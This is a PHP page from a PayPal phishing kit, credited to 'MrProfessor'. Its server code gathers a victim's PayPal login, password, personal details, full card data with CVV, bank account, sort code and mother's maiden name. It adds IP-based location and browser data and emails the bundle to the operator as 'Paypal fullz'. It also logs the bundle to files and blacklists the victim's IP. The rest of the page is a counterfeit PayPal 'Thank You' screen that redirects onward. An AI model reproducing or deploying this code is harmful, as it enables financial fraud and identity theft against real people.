<?php
/*
* Scampage by MrProfessor
* Jabber: mrprofessor@jodo.im
* ICQ: C3AS3R
*/
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');


$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['username'];
$pass = $_SESSION['password'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$telephone = $_SESSION['telephone'];
$email = $_SESSION['email'];
$address = $_SESSION['address'].", ".$_SESSION['city'].", ".$_SESSION['postcode'];
$address2 = $_SESSION['address2'];
$county = $_SESSION['county'];
$ccname = $_SESSION['ccname'];
$ccno = $_SESSION['ccno'];
$ccexp = $_SESSION['ccexp'];
$secode = $_SESSION['secode'];
$sortcode = $_SESSION['sortcode'];
$account = $_SESSION['account'];
$mmn = $_SESSION['mmn'];
$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
+ ------------- uncle zino pp --------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Address 2 : $address2
| County  : $county
| Telephone : $telephone
| Email : $email (Username PayPal)
+ ------------------------------------------+
+ Billing Information
| Card BIN : $BIN
| Card Bank : $Bank
| Card Type : $Brand $Type
| Cardholder Name : $ccname
| Card Number : $ccno
| Card Exp : $ccexp
| CVV : $secode
| Account : $account
| Sort Code : $sortcode
| MMN : $mmn
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";

if ($sendEmail === 1) {
	mail($to,  "Paypal fullz from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
	$file = fopen('assets/logs/fullz_vbv.txt', 'a');
	fwrite($file, $data . "\n");
	fclose($file);
}

if ($binList === 1) {
	$binFile = fopen('bin_list.txt', 'a');
    fwrite($binFile, $BIN . "\n");
    fclose($binFile);
}
 
 
if ($binSave === 1) {
    $binlist = fopen("assets/logs/" . $BIN.".txt","a");
    fwrite($binlist, $data . "\n\n");
    fclose($binlist);
}

if($One_Time_Access === 1)
{
$fp = fopen("assets/includes/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
}


?>

<!DOCTYPE html>
<html lang="en-RO" data-device-type="dedicated" class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Thank You</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta http-equiv="refresh" content="5;url=gateway.php">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
    <script>
        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 11, digits: true,},
                                email: { required: true, email: true,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
                                telephone: {
                                    required: "Please provide telephone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("three").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("four").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("five").value=address;
            var town = document.getElementById("town").value;
            document.getElementById("six").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("seven").value=postcode;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 8,},
                                sortcode: { required: true, minlength: 8,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                sortcode: {
                                    required: "Please provide 6 digit sort code",
                                    minlength: jQuery.validator.format("Please check the sort code you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>

    <link href="assets/files_details/page.b1eb2f27e98c4dc92711.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
</head>
<body class="">
<div id="app-element-mountpoint">
    <div id="document-body" dir="ltr" data-reactroot="">
        <div class="backgroundColor">
            <script src="assets/files_details/oneTouchInject.min.js.descărcare" async="" defer=""></script>
            <div>
                <div class="signup clear app-wrapper">
                    <div class="signup-page-header"><a aria-label="Paypal" href="#" class="signup-page-header-logo" pa-marked="1"></a><a href="#" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary" pa-marked="1">Log Out</a></div>
                    <main>
                        <div>
                            <div class="signup-page-form">
                                <div class="notification"></div>
                                <div>
                                    <form id="verify" action="Step2.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" class="signupAppContent" method="POST">
                                        <div>
                                            <div>
                                               
                                            </div>
                                            <div style="text-align: center;">
                                                <Br />
                                                <Br />
                                                <Br />
											
												<img src="assets/spin.gif" style="width: 55px;" />
												
										
											
                                               
                                                <Br />
                                                <Br />
												<p style="text-align: center;">
											
													You will be redirected shortly to your bank account to verify your data.
                                                </p>

                                            </div>
                                             </form>


                                </div>
                                <div class="signup-page-footer vx_text-legal text-center">©1999–2020 PayPal. All rights reserved.<span class="signup-page-footer-separator">|</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Privacy</a><span class="signup-page-footer-spacer">&nbsp;</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Legal</a><span class="signup-page-footer-spacer">&nbsp;</span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1">Contact</a><span class="signup-page-footer-spacer">&nbsp;</span><span><a class="vx_text-legal" style="cursor:pointer" pa-marked="1">Feedback</a></span><a href="#" target="_blank" class="vx_text-legal" pa-marked="1"></a></div>
                            </div>
                        </div>
                    </main>
                    <div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;overflow:hidden"></div>
                </div>
            </div>
        </div>
    </div>
</div>
<script src="assets/files_details/react-16_2_0-bundle.js.descărcare" charset="UTF-8"></script><script src="assets/files_details/54bab271e8430a459f7beef45055d464072a9b.js.descărcare" charset="UTF-8"></script><script src="assets/files_details/vendor.7a596b2180fb65be59b2.js.descărcare" charset="UTF-8"></script><script src="assets/files_details/page.b1eb2f27e98c4dc92711.js.descărcare" charset="UTF-8"></script><script nonce="" charset="UTF-8">
    if (typeof window !== "undefined" && window.document) {
        if (typeof PageBundle.default.renderApp === "function") {
            PageBundle.default.renderApp(window.modelData);
        } else {
            var appElement = React.createElement(window.PageBundle.default, { modelData: window.modelData });
            var mountPoint = window.document.getElementById("app-element-mountpoint");
            ReactDOM.hydrate && ReactDOM.hydrate(appElement, mountPoint) || ReactDOM.render(appElement, mountPoint);
        }
    }
</script><script nonce="" type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99">{"f": "d63338a0bb7c11e886e45b2df5a3214c", "s": "t_s"}</script><script nonce="" type="text/javascript" src="assets/files_details/fb.js.descărcare"></script>
<div>
    <div>
        <!--
           script: node, date: undefined, country: RO, language: en
           hostname: rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0EBzfgrVKf5UP9+3IJGCeU3THqspu3vQX
           rlogid: rZJvnqaaQhLn%2FnmWT8cSUvZzdT4xVEYcdOjZnkGUylc8kYBWJIjkjU2dkaPSgTjeTi4HVaNt4iTb31oGXiMI8wFhdxiLqn%2Fb_165ee40c913
           -->
    </div>
    <script nonce="">(function(){
            window.dataLayer = window.dataLayer || {};
            window.dataLayer.fptiGuid = 'ec9678251650a1e821726f4affffd447';
            window.dataLayer.FptiId = 'ec9678251650a1e821726f4affffd447';
            window.dataLayer.contentCountry = 'RO';
            window.dataLayer.contentLanguage = 'en';
        })()
    </script>


    <div></div>
</div>
</body>
<div id="recaptchaEventListenerAdded"></div>
</html>
